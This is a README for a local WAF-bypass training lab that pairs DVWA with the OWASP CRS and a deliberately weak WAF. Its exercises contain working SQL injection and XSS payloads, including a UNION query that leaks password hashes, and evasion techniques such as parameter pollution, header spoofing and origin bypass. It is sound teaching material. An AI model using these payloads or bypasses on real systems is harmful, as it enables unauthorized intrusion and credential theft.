# WAF Bypass Practice Lab

An isolated, local-only lab for practicing **WAF evasion methodology**:
fingerprinting, payload obfuscation, parameter pollution, protocol quirks,
header tricks, and the difference between a signature WAF and a
syntax-aware one.

> 🇵🇭 A Tagalog version of this guide is available in [`README.tl.md`](README.tl.md).

---

## ⚠️ Warning

This lab runs **deliberately vulnerable software** (DVWA) and a
**deliberately weak WAF** (`weak_waf.py`). It is intended for:

- local practice,
- CTFs,
- authorized security training,
- building and testing detection logic.

**Never expose it to a public network or the internet.** All services bind to
`127.0.0.1` by default. See [Authorized use](#authorized-use).

---

## Architecture

```
                         ┌──────────────────────────────────────────────┐
   DVWA direct  :8080 ──▶│ DVWA — deliberately vulnerable web app       │
                         │ admin / password, security level: low        │
                         └──────────────────────────────────────────────┘
                                        ▲
   CRS WAF      :8081 ──▶ nginx + ModSecurity + OWASP CRS 4.x ─────────┘
                         strong: libinjection + inbound anomaly scoring

   Weak WAF     :8084 ──▶ naive Python literal matcher ─────────────────┘
                         intentionally bypassable, for learning

   Echo direct  :8082 ──▶ request echo (method, headers, body, query)
   CRS WAF echo :8083 ──▶ echo behind CRS
   Weak echo    :8085 ──▶ echo behind WeakWAF
```

| Port | Service | Purpose |
|-----:|---------|---------|
| 8080 | DVWA direct | Baseline / simulated exposed origin |
| 8081 | DVWA behind **CRS** | Real-world WAF with rule IDs in logs |
| 8082 | Echo direct | Baseline for headers, methods, HPP |
| 8083 | Echo behind **CRS** | How CRS treats headers/methods |
| 8084 | DVWA behind **WeakWAF** | Successful payload bypasses |
| 8085 | Echo behind **WeakWAF** | Method/header bypass demos |

All ports are overridable — see [Configuration](#configuration).

**DVWA credentials:** `admin` / `password` (security level is set to `low` by
`check.sh`).

---

## Requirements

- Linux or macOS with Docker (x86_64 host recommended)
- Docker Compose v2 (`docker compose version`)
- ~1.5 GB RAM and ~1 GB disk for images
- Internet access on first run (image pulls)

```bash
docker --version
docker compose version
docker info >/dev/null && echo "daemon OK"
```

On Ubuntu, if Compose v2 is missing:

```bash
sudo apt update && sudo apt install -y docker-compose-v2
sudo usermod -aG docker "$USER" && newgrp docker
```

---

## Quick start

```bash
git clone <your-repo-url> waf-lab
cd waf-lab

cp .env.example .env    # optional — edit ports/binding
./deploy.sh             # checks prerequisites + ports, starts, runs tests
```

Manual equivalent:

```bash
docker compose up -d
./check.sh              # initializes DVWA and runs the full test matrix
./check.sh --tests      # tests only, after initial setup
```

Useful commands:

```bash
docker compose ps
docker compose logs -f waf        # CRS decisions + rule IDs
docker compose logs -f weak-waf   # WeakWAF decisions
docker compose down -v            # full reset (including the DVWA database)
```

---

## Configuration

Copy `.env.example` to `.env`; both Docker Compose and `check.sh` read it.

| Variable | Default | Meaning |
|---|---|---|
| `LAB_BIND` | `127.0.0.1` | Interface to publish ports on |
| `LAB_HOST` | `127.0.0.1` | Host used by `check.sh` for requests |
| `DVWA_PORT` | `8080` | DVWA direct |
| `WAF_PORT` | `8081` | CRS WAF → DVWA |
| `ECHO_PORT` | `8082` | Echo direct |
| `WAF_ECHO_PORT` | `8083` | CRS WAF → echo |
| `WEAK_PORT` | `8084` | WeakWAF → DVWA |
| `WEAK_ECHO_PORT` | `8085` | WeakWAF → echo |

If `8080` is already taken by another lab (crAPI, Juice Shop, etc.), shift the
whole range:

```bash
cp .env.example .env
sed -i -e 's/^DVWA_PORT=8080/DVWA_PORT=9080/' \
       -e 's/^WAF_PORT=8081/WAF_PORT=9081/' \
       -e 's/^ECHO_PORT=8082/ECHO_PORT=9082/' \
       -e 's/^WAF_ECHO_PORT=8083/WAF_ECHO_PORT=9083/' \
       -e 's/^WEAK_PORT=8084/WEAK_PORT=9084/' \
       -e 's/^WEAK_ECHO_PORT=8085/WEAK_ECHO_PORT=9085/' .env
./deploy.sh
```

`deploy.sh` refuses to start if a port is already in use and prints the fix.

---

## Exercises

### 1 — Fingerprint the WAF

```bash
curl -si http://127.0.0.1:8081/ | head -20
curl -si http://127.0.0.1:8080/ | head -20
```

**Questions:** Which headers/cookies reveal a WAF? What differs between the
direct and proxied responses?

---

### 2 — See block vs pass

```bash
JAR=.dvwa-cookies.txt

# Benign
curl -s -b "$JAR" -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit'

# Malicious
curl -s -b "$JAR" -o /dev/null -w '%{http_code}\n' \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/'
```

Expected: `200`, then `403`.

In `docker compose logs waf`, look for:

- `ruleId: 942100` — SQL injection detected via libinjection
- `ruleId: 949110` — inbound anomaly score exceeded

**Lesson:** blocking is score-based, not a single-rule decision.

---

### 3 — CRS resists classic variants

All of these should return `403` on port **8081**:

```bash
for p in \
  "1' OR '1'='1" \
  "1' OR 1=1-- -" \
  "1' UNION SELECT user,password FROM users-- -" \
  "1' UNION/**/SELECT/**/user,password/**/FROM/**/users-- -" \
  "1' OR 1 LIKE 1-- -" \
  "1' || '1'='1"
do
  code=$(curl -s -b .dvwa-cookies.txt -o /dev/null -w '%{http_code}' \
    -G --data-urlencode "id=$p" --data-urlencode 'Submit=Submit' \
    'http://127.0.0.1:8081/vulnerabilities/sqli/')
  printf '%s  %s\n' "$code" "$p"
done
```

**Lesson:** libinjection is syntax-aware. Case changes and comment injection
do not defeat it — you need a different layer (identity, protocol, origin).

---

### 4 — WeakWAF: real bypasses

On port **8084**:

```bash
# 1) Literal payload — blocked
curl -s -b .dvwa-cookies.txt -o /dev/null -w '%{http_code}\n' \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/'

# 2) Case variation — bypass
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' oR 1=1-- -" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'

# 3) Comment injection — bypass
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1'/**/OR/**/'1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'

# 4) UNION leak — bypass
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' UnIoN SeLeCt user,password FROM users-- -" \
  --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'
```

Expected: multiple users returned, and password hashes via the UNION payload.

**Lesson:** `UNION SELECT` and `UnIoN SeLeCt` are identical to the SQL engine
but different to a naive signature matcher.

---

### 5 — HTTP Parameter Pollution

```bash
# WeakWAF checks only the FIRST value; PHP uses the LAST value.
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode 'id=1' \
  --data-urlencode "id=1' OR '1'='1" \
  --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -c 'First name:'
```

Expected: multiple rows. Compare with CRS on `:8081`, which inspects all values
and still returns `403`.

---

### 6 — XSS bypass

```bash
# Literal <script> — blocked
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<script>alert(1)</script>' \
  -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8084/vulnerabilities/xss_r/'

# Case bypass
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<ScRiPt>alert(1)</ScRiPt>' \
  'http://127.0.0.1:8084/vulnerabilities/xss_r/' | grep -o 'Hello.*'

# Alternative tag
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<img src=x onerror=alert(1)>' \
  'http://127.0.0.1:8084/vulnerabilities/xss_r/' | grep -o 'Hello.*'
```

Open the responses in a local browser to observe execution.

---

### 7 — Method and header handling

```bash
# Direct echo
curl -s http://127.0.0.1:8082/method

# WeakWAF inspects only GET/POST -> PUT passes
curl -s -X PUT http://127.0.0.1:8085/method

# CRS blocks X-HTTP-Method-Override
curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  -H 'X-HTTP-Method-Override: PUT' http://127.0.0.1:8083/method

# Header passthrough
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://127.0.0.1:8085/headers
```

**Lesson:** each WAF inspects a different surface. Learn *where* it looks
before crafting a payload.

---

### 8 — Origin bypass

In the lab, `:8080` represents an exposed origin.

```bash
# Through the WAF — blocked
curl -s -o /dev/null -w 'WAF: %{http_code}\n' -b .dvwa-cookies.txt \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/'

# Direct origin — no WAF in path
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' OR 1=1-- -" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8080/vulnerabilities/sqli/' | grep -E 'First name|Surname'
```

**Lesson:** the strongest "bypass" is avoiding the WAF entirely. In real
engagements, only test origins that are explicitly in scope.

---

## WeakWAF design

`weak_waf.py` is a small reverse proxy with **six intentional weaknesses**,
each mapped to a technique:

| Weakness | Technique |
|---|---|
| Case-sensitive literal matching | case variation |
| No normalization of input | comment injection, encoding |
| Only the **first** value of a parameter is checked | HTTP parameter pollution |
| Only `GET`/`POST` are inspected | method obfuscation |
| Query/body only — headers ignored | header tricks |
| No decoding of body | encoding variants |

It is a teaching tool, not a WAF. **Do not reuse it as a security control.**

---

## Verification principle

> `200 OK` is **not** proof of a bypass.

Require an application-level effect, and reproduce it 3/3:

- **SQLi:** multiple rows, or leaked hashes
- **XSS:** payload reflected unmodified in the executed context
- **Headers:** the spoofed value appears in the echo response

`check.sh` automates the matrix and includes a row-count check.

---

## Deploying on another host

The lab is self-contained. No data migration is required — the DVWA database
lives inside its container.

```bash
# From the source machine
rsync -av --exclude '.dvwa-cookies.txt' --exclude 'evidence/' \
  waf-lab/ user@HOST:/opt/waf-lab/

# On the target host
cd /opt/waf-lab
cp .env.example .env
./deploy.sh
```

### Coexisting with other labs

Common conflicts and their usual ports:

| Service | Typical port |
|---|---|
| crAPI web | 8888 |
| crAPI identity | 8080 |
| MailHog | 8025 |
| PostgreSQL | 5432 |
| MongoDB | 27017 |
| Jaeger | 16686 |
| Prometheus | 9090 |
| Grafana | 3000 |

Check first:

```bash
docker ps --format 'table {{.Names}}\t{{.Ports}}'
ss -ltn
```

If `8080–8085` is occupied, use the `9080–9085` example in
[Configuration](#configuration). Separate Compose projects and container
names (`waflab-*`) keep the stacks independent.

### Access from another machine

By default the lab binds to `127.0.0.1`. To reach it from another host on an
**isolated lab network**, set `LAB_BIND` to the LAN IP or `0.0.0.0`, then
restrict access with a firewall:

```bash
sudo ufw allow from 192.168.1.0/24 to any port 9080:9085 proto tcp
```

Never expose this stack to an untrusted network.

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `permission denied` on the Docker socket | `sudo usermod -aG docker "$USER" && newgrp docker` |
| `docker compose` not found | Install `docker-compose-v2` or `docker-compose-plugin` |
| Port already allocated | Copy `.env.example` → `.env`, shift ports, re-run `./deploy.sh` |
| DVWA keeps redirecting to `login.php` | Run `./check.sh` — it creates the DB and logs in |
| DVWA shows "database not found" | `docker compose down -v && docker compose up -d && ./check.sh` |
| `curl --http3` unsupported | Check `curl -V`; HTTP/3 is optional |
| Apple Silicon / ARM host | `vulnerables/web-dvwa` is amd64-only; use an x86_64 host or emulation |
| WeakWAF returns `502` | Check `docker compose logs weak-waf`; backend may still be starting |

Reset everything:

```bash
docker compose down -v
docker compose up -d
./check.sh
```

---

## Repository layout

```
waf-lab/
├── docker-compose.yml       # 6 services
├── weak_waf.py              # deliberately naive WAF
├── check.sh                 # DVWA setup + test matrix
├── deploy.sh                # prerequisite/port checks + start
├── .env.example             # ports and binding
├── README.md                # this file
├── README.tl.md             # Tagalog version
├── SECURITY.md              # lab safety notice
└── .github/workflows/ci.yml # lint + syntax + compose validation
```

Runtime artifacts (`.env`, `.dvwa-cookies.txt`, `evidence/`) are gitignored.

---

## Authorized use

This project is for **authorized security testing, education, and research**.
Use it only against systems you own or have explicit written permission to
test. The authors are not responsible for misuse.

If you deploy this lab, keep it on an isolated network, bind it to localhost
or a restricted interface, and tear it down when finished.

---

## References

- [DVWA](https://github.com/digininja/DVWA) — Damn Vulnerable Web Application
- [OWASP ModSecurity Core Rule Set](https://github.com/coreruleset/coreruleset)
- [ModSecurity](https://github.com/owasp-modsecurity/ModSecurity)
- [libinjection](https://github.com/libinjection/libinjection)
- Docker images: `vulnerables/web-dvwa`, `owasp/modsecurity-crs`,
  `mendhak/http-https-echo`
- Methodology inspired by the `offensive-waf-bypass` checklist

---

## License

[MIT](LICENSE)
